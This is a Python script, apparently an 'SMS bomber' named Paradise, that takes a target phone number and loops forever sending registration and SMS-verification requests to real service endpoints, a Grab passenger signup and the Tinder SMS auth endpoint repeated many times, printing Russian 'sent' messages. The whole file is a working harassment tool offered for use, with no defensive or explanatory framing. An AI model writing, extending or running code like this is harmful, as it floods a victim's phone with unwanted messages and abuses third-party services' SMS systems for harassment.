#-= It's just illusion =-#

import requests
from threading import Thread
import random
from termcolor import colored

print(colored('''

█▀▀█ █▀▀█ █▀▀█ █▀▀█ █▀▀▄ ░▀░ █▀▀ █▀▀
█░░█ █▄▄█ █▄▄▀ █▄▄█ █░░█ ▀█▀ ▀▀█ █▀▀
█▀▀▀ ▀░░▀ ▀░▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀ ▀▀▀

		  create by Matt
    ''', 'magenta' ))


phone = input(colored('Enter your phone number>>: ','cyan'))
countT = input(colored('Enter threading>>: ','blue'))


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	while True:
		request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print('[+] Grab отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Не отправлено!')